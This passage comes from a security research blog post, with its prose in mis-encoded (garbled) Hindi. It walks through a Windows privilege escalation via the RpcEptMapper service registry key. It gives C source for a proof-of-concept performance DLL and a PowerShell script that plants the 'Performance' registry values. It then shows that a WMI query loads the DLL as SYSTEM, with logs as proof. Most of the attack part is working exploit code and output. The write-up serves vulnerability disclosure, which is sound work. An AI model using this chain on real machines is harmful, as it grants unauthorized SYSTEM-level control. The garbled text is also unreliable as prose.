рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛рддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдореИрдВрдиреЗ рдПрдХ "_Dynamic-Link Library (DLL)_" рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдмрдирд╛ рд╕рдХрддрд╛ рдерд╛ рд▓реЗрдХрд┐рди рдореБрдЭреЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдпрд╣ рдЖрд╕рд╛рди рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдмрд╕ рдПрдХ рдХрдВрд╕реЛрд▓ рдРрдк рдХреЗ рд╕рд╛рде рд╢реБрд░реБрдЖрдд рдХрд░реВрдБред

рдпрд╣рд╛рдБ Visual Studio рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдХреЛрдб рд╣реИ:
```c
#include <iostream>

int main()
{
std::cout << "Hello World!\n";
}
```
рдмреЗрд╢рдХ, рдпрд╣ рд╡рд╣ рдирд╣реАрдВ рд╣реИ рдЬреЛ рд╣рдо рдЪрд╛рд╣рддреЗ рд╣реИрдВред рд╣рдореЗрдВ рдПрдХ EXE рдирд╣реАрдВ, рдмрд▓реНрдХрд┐ рдПрдХ DLL рдмрдирд╛рдирд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ `main` рдлрд╝рдВрдХреНрд╢рди рдХреЛ `DllMain` рд╕реЗ рдмрджрд▓рдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрдХреЗрд▓реЗрдЯрди рдХреЛрдб рдЖрдкрдХреЛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг рдореЗрдВ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ: [Initialize a DLL](https://docs.microsoft.com/en-us/cpp/build/run-time-library-behavior#initialize-a-dll)ред
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
switch (reason)
{
case DLL_PROCESS_ATTACH:
Log(L"DllMain"); // See log helper function below
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```
```markdown
рдЗрд╕рдХреЗ рд╕рд╛рде-рд╕рд╛рде, рд╣рдореЗрдВ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рднреА рдмрджрд▓рд╛рд╡ рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ рдХрдВрдкрд╛рдЗрд▓ рдХреА рдЧрдИ рдлрд╛рдЗрд▓ рдПрдХ DLL рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдирд╛ рдХрд┐ EXE. рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рдХреЛ рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░, "**General**" рд╕реЗрдХреНрд╢рди рдореЗрдВ, "**Dynamic Library (.dll)**" рдХреЛ "**Configuration Type**" рдХреЗ рд░реВрдк рдореЗрдВ рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВред рдЯрд╛рдЗрдЯрд▓ рдмрд╛рд░ рдХреЗ рдареАрдХ рдиреАрдЪреЗ, рдЖрдк "**All Configurations**" рдФрд░ "**All Platforms**" рднреА рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рд╡реИрд╢реНрд╡рд┐рдХ рд░реВрдк рд╕реЗ рд▓рд╛рдЧреВ рдХреА рдЬрд╛ рд╕рдХреЗред

рдЗрд╕рдХреЗ рдмрд╛рдж, рдореИрдВ рдЕрдкрдирд╛ рдХрд╕реНрдЯрдо рд▓реЙрдЧ рд╣реЗрд▓реНрдкрд░ рдлрдВрдХреНрд╢рди рдЬреЛрдбрд╝рддрд╛ рд╣реВрдБред
```
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
LPWSTR pwszBuffer, pwszCommandLine;
WCHAR wszUsername[UNLEN + 1] = { 0 };
SYSTEMTIME st = { 0 };
HANDLE hToolhelpSnapshot;
PROCESSENTRY32 stProcessEntry = { 0 };
DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
BOOL bResult = FALSE;

// Get the command line of the current process
pwszCommandLine = GetCommandLine();

// Get the name of the process owner
GetUserName(wszUsername, &dwPcbBuffer);

// Get the PID of the current process
dwProcessId = GetCurrentProcessId();

// Get the PID of the parent process
hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
do {
if (stProcessEntry.th32ProcessID == dwProcessId) {
dwParentProcessId = stProcessEntry.th32ParentProcessID;
break;
}
} while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
}
CloseHandle(hToolhelpSnapshot);

// Get the current date and time
GetLocalTime(&st);

// Prepare the output string and log the result
dwBufSize = 4096 * sizeof(WCHAR);
pwszBuffer = (LPWSTR)malloc(dwBufSize);
if (pwszBuffer)
{
StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
st.wHour,
st.wMinute,
st.wSecond,
dwProcessId,
dwParentProcessId,
wszUsername,
pwszCommandLine,
pwszCallingFrom
);

LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

free(pwszBuffer);
}
}
```
рдлрд┐рд░, рд╣рдо DLL рдХреЛ рдЙрди рддреАрди рдлрдВрдХреНрд╢рдиреНрд╕ рд╕реЗ рднрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╣рдордиреЗ рдбреЙрдХреНрдпреВрдореЗрдВрдЯреЗрд╢рди рдореЗрдВ рджреЗрдЦреЗ рдереЗред рдбреЙрдХреНрдпреВрдореЗрдВрдЯреЗрд╢рди рдпрд╣ рднреА рдХрд╣рддрд╛ рд╣реИ рдХрд┐ рдЕрдЧрд░ рд╕рдлрд▓ рд╣реЛ, рддреЛ рдЙрдиреНрд╣реЗрдВ `ERROR_SUCCESS` рд▓реМрдЯрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
Log(L"OpenPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
Log(L"CollectPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
Log(L"ClosePerfData");
return ERROR_SUCCESS;
}
```
рдареАрдХ рд╣реИ, рддреЛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдЕрдм рдЙрдЪрд┐рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, `DllMain` рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ рд▓реЙрдЧ рд╕рд╣рд╛рдпрдХ рдлрд╝рдВрдХреНрд╢рди рдФрд░ рддреАрди рдЖрд╡рд╢реНрдпрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ рдЕрдВрддрд┐рдо рдЪреАрдЬрд╝ рдЕрднреА рднреА рдЧрд╛рдпрдм рд╣реИред рдпрджрд┐ рд╣рдо рдЗрд╕ рдХреЛрдб рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рддреЗ рд╣реИрдВ, `OpenPerfData`, `CollectPerfData` рдФрд░ `ClosePerfData` рдХреЗрд╡рд▓ рдЖрдВрддрд░рд┐рдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реЛрдВрдЧреЗ рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдЙрдиреНрд╣реЗрдВ **рдирд┐рд░реНрдпрд╛рдд** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдпрд╣ рдХрдИ рддрд░реАрдХреЛрдВ рд╕реЗ рд╣рд╛рд╕рд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдПрдХ [DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files) рдлрд╝рд╛рдЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ рдЙрдЪрд┐рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдореБрдЭреЗ `__declspec(dllexport)` рдХреАрд╡рд░реНрдб ([рджрд╕реНрддрд╛рд╡реЗрдЬрд╝](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдкрд╕рдВрдж рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЗрд╕ рддрд░рд╣ рдХреЗ рдЫреЛрдЯреЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдПред рдЗрд╕ рддрд░рд╣, рд╣рдореЗрдВ рдХреЗрд╡рд▓ рд╕реНрд░реЛрдд рдХреЛрдб рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рддреАрди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдШреЛрд╖рд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
рдпрджрд┐ рдЖрдк рдкреВрд░рд╛ рдХреЛрдб рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдореИрдВрдиреЗ рдЗрд╕реЗ [рдпрд╣рд╛рдБ](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12) рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рд╣реИред

рдЕрдВрдд рдореЗрдВ, рд╣рдо _**Release/x64**_ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ "_**Build the solution**_" рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рд╣рдорд╛рд░реА DLL рдлрд╛рдЗрд▓ рдмрдиреЗрдЧреА: `.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`.

## PoC рдХрд╛ рдкрд░реАрдХреНрд╖рдг <a href="#testing-the-poc" id="testing-the-poc"></a>

рдЖрдЧреЗ рдмрдврд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдореИрдВ рд╣рдореЗрд╢рд╛ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реВрдБ рдХрд┐ рдореЗрд░рд╛ рдкреЗрд▓реЛрдб рдареАрдХ рд╕реЗ рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИ, рдЗрд╕реЗ рдЕрд▓рдЧ рд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд░рдХреЗред рдпрд╣рд╛рдБ рдмрд┐рддрд╛рдпрд╛ рдЧрдпрд╛ рдереЛрдбрд╝рд╛ рд╕рдордп рдмрд╛рдж рдореЗрдВ рдмрд╣реБрдд рд╕рдордп рдмрдЪрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рд░реЛрдХрдХрд░ рдХрд┐ рдЖрдк рдХрд┐рд╕реА рдХрд╛рд▓реНрдкрдирд┐рдХ рдбреАрдмрдЧ рдЪрд░рдг рдХреЗ рджреМрд░рд╛рди рдЦрд░рдЧреЛрд╢ рдХреЗ рдмрд┐рд▓ рдореЗрдВ рди рдЪрд▓реЗ рдЬрд╛рдПрдБред рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдмрд╕ `rundll32.exe` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ DLL рдХрд╛ рдирд╛рдо рдФрд░ рдирд┐рд░реНрдпрд╛рдд рдХрд┐рдП рдЧрдП рдлрдВрдХреНрд╢рди рдХрд╛ рдирд╛рдо рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛, рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЧрдИ рдереА рдФрд░, рдЕрдЧрд░ рд╣рдо рдЗрд╕реЗ рдЦреЛрд▓реЗрдВ, рддреЛ рд╣рдо рджреЛ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпрд╛рдБ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдкрд╣рд▓реА рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рддрдм рд▓рд┐рдЦреА рдЧрдИ рдереА рдЬрдм DLL рдХреЛ `rundll32.exe` рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рджреВрд╕рд░реА рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рддрдм рд▓рд┐рдЦреА рдЧрдИ рдереА рдЬрдм `OpenPerfData` рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рджрд┐рдЦрдиреЗ рдореЗрдВ рдЕрдЪреНрдЫрд╛ рд╣реИ! ![:slightly_smiling_face:](https://github.githubassets.com/images/icons/emoji/unicode/1f642.png)
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
рдЕрдм рд╣рдо рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрд╡рд╢реНрдпрдХ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдФрд░ рдорд╛рдиреЛрдВ рдХреЛ рдмрдирд╛рдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдо рдпрд╛ рддреЛ рдЗрд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ `reg.exe` / `regedit.exe` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╛ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░реЛрдЧреНрд░рд╛рдореЗрдЯрд┐рдХ рд░реВрдк рд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЪреВрдВрдХрд┐ рдореИрдВрдиреЗ рдкрд╣рд▓реЗ рд╣реА рдЕрдкрдиреЗ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЕрдиреБрд╕рдВрдзрд╛рди рдХреЗ рджреМрд░рд╛рди рдореИрдиреНрдпреБрдЕрд▓ рдЪрд░рдгреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рдирд╛ рд╣реИ, рдореИрдВ рдПрдХ PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рд╡рд╣реА рдХрд╛рдо рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╕рд╛рдл рддрд░реАрдХрд╛ рджрд┐рдЦрд╛рдКрдВрдЧрд╛ред рд╡реИрд╕реЗ рднреА, PowerShell рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдФрд░ рдорд╛рди рдмрдирд╛рдирд╛ `New-Item` рдФрд░ `New-ItemProperty` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдЬрд┐рддрдирд╛ рдЖрд╕рд╛рди рд╣реИ, рд╣реИ рдирд╛? ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

`Requested registry access is not allowed`тАж рд╣рдореНрдореНрдо, рдареАрдХ рд╣реИтАж рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдЗрддрдирд╛ рдЖрд╕рд╛рди рдирд╣реАрдВ рд╣реЛрдЧрд╛ред ![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

рдореИрдВрдиреЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЗрд╕ рдореБрджреНрджреЗ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рд▓реЗрдХрд┐рди рдореЗрд░рд╛ рдЕрдиреБрдорд╛рди рд╣реИ рдХрд┐ рдЬрдм рд╣рдо `New-Item` рдХреЛ рдХреЙрд▓ рдХрд░рддреЗ рд╣реИрдВ, `powershell.exe` рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдХреБрдЫ рдЭрдВрдбреЗ рдХреЗ рд╕рд╛рде рдорд╛рддрд╛-рдкрд┐рддрд╛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдХреЛ рдЦреЛрд▓рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдирд╣реАрдВ рд╣реИрдВред

рд╡реИрд╕реЗ рднреА, рдЕрдЧрд░ рдмрд┐рд▓реНрдЯ-рдЗрди cmdlets рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рд╣рдореЗрд╢рд╛ рдПрдХ рд╕реНрддрд░ рдиреАрдЪреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕реАрдзреЗ DotNet рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдЗрдиреНрд╡реЛрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЗ рд╕рд╛рде PowerShell рдореЗрдВ рднреА рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдмрдирд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИред
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
рдпрд╣рд╛рдБ рд╣рдо рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ! рдЕрдВрдд рдореЗрдВ, рдореИрдВрдиреЗ рдЙрдЪрд┐рдд рдХреБрдВрдЬреА рдФрд░ рдорд╛рдиреЛрдВ рдХреЛ рдмрдирд╛рдиреЗ, рдХреБрдЫ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреЗ рдФрд░ рдЕрдВрдд рдореЗрдВ рд╕рдм рдХреБрдЫ рд╕рд╛рдл рдХрд░рдХреЗ рд╕рдорд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рддреИрдпрд╛рд░ рдХреАред
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
рдЕрдВрддрд┐рдо рдЪрд░рдг рдЕрдм, **рд╣рдо RPC Endpoint Mapper рд╕реЗрд╡рд╛ рдХреЛ рд╣рдорд╛рд░реЗ Performace DLL рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреИрд╕реЗ рдЪрд╛рд▓рд╛рдХреА рд╕реЗ рдкреНрд░реЗрд░рд┐рдд рдХрд░реЗрдВ?** рджреБрд░реНрднрд╛рдЧреНрдпрд╡рд╢, рдореИрдВрдиреЗ рдЙрди рд╕рднреА рд╡рд┐рднрд┐рдиреНрди рдЪреАрдЬреЛрдВ рдХрд╛ рдЯреНрд░реИрдХ рдирд╣реАрдВ рд░рдЦрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдореИрдВрдиреЗ рдЖрдЬрдорд╛рдпрд╛ рд╣реИред рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдпрд╣ рдмрддрд╛рдирд╛ рдмрд╣реБрдд рд░реЛрдЪрдХ рд╣реЛрддрд╛ рдХрд┐ рдХрднреА-рдХрднреА рд╢реЛрдз рдХрд┐рддрдирд╛ рдердХрд╛рдК рдФрд░ рд╕рдордп рд▓реЗрдиреЗ рд╡рд╛рд▓рд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рд╡реИрд╕реЗ рднреА, рд░рд╛рд╕реНрддреЗ рдореЗрдВ рдореБрдЭреЗ рдПрдХ рдЪреАрдЬ рдорд┐рд▓реА рд╣реИ рдХрд┐ рдЖрдк WMI (_Windows Management Instrumentation_) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ _Perfomance Counters_ рдХреА рдХреНрд╡реЗрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдЖрдЦрд┐рд░рдХрд╛рд░ рдмрд╣реБрдд рдЖрд╢реНрдЪрд░реНрдпрдЬрдирдХ рдирд╣реАрдВ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рд╣реИ: [_WMI Performance Counter Types_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types).

> _Counter types рдЧреБрдгреЛрдВ рдХреЗ рд▓рд┐рдП CounterType qualifier рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрддреЗ рд╣реИрдВ_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _рдХрдХреНрд╖рд╛рдУрдВ рдореЗрдВ, рдФрд░ рдЧреБрдгреЛрдВ рдХреЗ рд▓рд┐рдП CookingType qualifier рдХреЗ рд░реВрдк рдореЗрдВ_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _рдХрдХреНрд╖рд╛рдУрдВ рдореЗрдВред_

рддреЛ, рдореИрдВрдиреЗ рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ PowerShell рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ _Performace Data_ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд WMI рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧрд┐рдирд╛ред
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12_powershell-get-wmiobject.gif)

рдФрд░, рдореИрдВрдиреЗ рджреЗрдЦрд╛ рдХрд┐ рдореЗрд░реА рд▓реЙрдЧ рдлрд╛рдЗрд▓ рд▓рдЧрднрдЧ рддреБрд░рдВрдд рдмрди рдЧрдИ рдереА! рдпрд╣рд╛рдБ рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рд╣реИред
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
